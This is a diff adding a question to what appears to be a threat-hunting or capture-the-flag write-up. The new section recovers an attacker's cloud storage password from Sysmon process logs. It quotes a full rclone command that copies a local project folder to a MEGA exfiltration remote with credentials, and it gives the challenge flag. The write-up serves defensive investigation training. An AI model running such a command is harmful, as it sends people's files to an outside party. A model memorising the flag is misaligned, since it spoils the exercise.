@@ -304,3 +304,22 @@ The query returned rclone's outbound connection, revealing the destination IP fo
 > **Lesson:** Sysmon Event ID 3 (Network Connection) is the fastest path to exfil destination IPs. Once you know the tool, pivot directly to its network activity — you get the destination IP, port, and timestamp in one query without needing to parse command line arguments.
 
 </details>
+
+<details>
+<summary>Q07 — Attacker Credential Exposure</summary>
+
+**Goal:** Identify the password used to authenticate to the cloud storage exfiltration account.
+
+**Approach:** No additional query needed. The rclone command captured in Q02 contained both the username and password in plaintext as command line arguments. The `--mega-pass` parameter exposed the credential directly in the process execution log.
+
+From the Q02 rclone command:
+
+```
+rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
+```
+
+**Flag:** `Summer2024!`
+
+> **Lesson:** Attackers frequently pass credentials directly as command line arguments, trading operational security for convenience. These show up verbatim in Sysmon Event ID 1 (Process Creation) logs. A single rclone command exposed the cloud storage service, destination path, email, and password simultaneously. When you find an exfil tool in the logs, always read the full argument list — credentials, config paths, and remote destinations are often right there.
+
+</details>
